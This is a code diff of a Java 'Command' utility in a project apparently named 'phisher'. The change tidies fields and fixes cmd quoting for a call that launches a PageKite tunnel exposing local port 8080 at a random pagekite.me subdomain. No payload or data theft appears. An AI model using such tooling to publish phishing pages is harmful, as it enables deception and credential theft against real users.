@@ -1,7 +1,5 @@
 package com.shaw.phisher.utils;
 
-import org.springframework.beans.factory.annotation.Value;
-
 import java.io.File;
 import java.io.IOException;
 import java.util.Arrays;
@@ -9,14 +7,12 @@ import java.util.Objects;
 import java.util.Random;
 
 public class Command {
-    @Value("pageKite.email")
-    public String pageKiteEmail;
-
     public static String inputFilePath = System.getProperty("user.home") + "/.phisher/.config";
     public static String pageKiteFilePath = System.getProperty("user.home") + "/.phisher/pagekite.py";
     public static Process execute(String command) throws IOException {
         return Runtime.getRuntime().exec(new String[]{command});
     }
+    public static Process pagekiteProcess;
 
     public static String getRandom(int digits){
         StringBuilder random30 = new StringBuilder();
@@ -24,7 +20,6 @@ public class Command {
         for(int i=0;i<digits;i++){
             random30.append(random.nextInt(10));
         }
-        System.out.println(random30.toString());
         return random30.toString();
     }
     public static void executePageKite() {
@@ -39,10 +34,11 @@ public class Command {
         }
 
         Integer i = Arrays.stream(Objects.requireNonNull(file.list())).map(e -> Integer.parseInt(e.substring(e.lastIndexOf('n') + 1))).max(Integer::compare).get();
+        inputFilePath = inputFilePath.replaceAll("\\s", "^ ");
 
         try {
-            ProcessBuilder processBuilder = new ProcessBuilder("cmd", "/c start cmd.exe /K \"" + pythonPath + "\\Python" + i + "\\python " + pageKiteFilePath + " 8080 " + getRandom(10) + ".pagekite.me < " + inputFilePath + "\"");
-            Process process = processBuilder.start();
+            ProcessBuilder processBuilder = new ProcessBuilder("cmd", "/c start cmd.exe /K \"\"" + pythonPath + "\\Python" + i + "\\python\" \"" + pageKiteFilePath + "\" 8080 " + getRandom(10) + ".pagekite.me < " + inputFilePath + "\"");
+            pagekiteProcess = processBuilder.start();
         } catch (Exception e) {
             System.out.println(e);
         }
